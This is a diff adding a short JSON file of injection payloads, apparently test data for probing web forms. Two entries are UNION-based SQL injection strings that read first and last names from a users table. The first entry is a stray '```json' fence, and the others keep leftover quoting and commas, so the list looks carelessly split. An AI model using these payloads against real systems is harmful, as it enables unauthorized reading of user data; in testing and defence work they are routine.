@@ -1,0 +1,14 @@
+[
+    {
+        "id": "70201d63-2965-4c97-85d6-032b4c145234",
+        "payload": "```json"
+    },
+    {
+        "id": "ae0510f8-c91f-4043-a6ab-d0d772c38b7e",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM users -- \","
+    },
+    {
+        "id": "42d0d74b-0b35-4250-af74-fd4e294c9f28",
+        "payload": "  \"' UNION SELECT first_name, last_name FROM users #\","
+    }
+]
